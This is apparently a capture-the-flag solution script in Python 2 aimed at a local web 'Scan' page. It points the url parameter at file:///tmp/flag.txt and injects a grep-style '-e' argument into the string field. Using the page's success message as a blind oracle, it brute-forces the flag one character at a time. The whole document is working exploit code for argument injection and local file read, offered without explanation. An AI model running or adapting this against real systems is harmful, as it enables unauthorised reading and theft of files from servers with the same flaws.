import socket, urllib

HOST = "127.0.0.1"
PORT = 8089
REQU = """GET /index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string={}&submit=Scan HTTP/1.1
Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8080/
Connection: close\r\n\r\n"""
REQU = """GET http://127.0.0.1:8089/index.php?url=file%3A%2F%2F%2Ftmp%2Fflag.txt&string={}&submit=Scan HTTP/1.1
Host: 127.0.0.1:8089
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost:8080/
Connection: close\r\n\r\n"""
ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

def corn9(guess):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))

	x = "-e '^flag{%s'" % (guess)
	s.send(REQU.format(urllib.quote_plus(x)))
	r = s.recv(8192)
	s.close()
	
	if "Yaaaaaassssss" in r:
		return True
	return False

p = ''
for i in xrange(64):
	f = False
	for c in ALPH:
		print p, c
		if corn9(p + c):
			f = True
			p = p + c
			break
	if not f:
		break

print "DONE"
print p
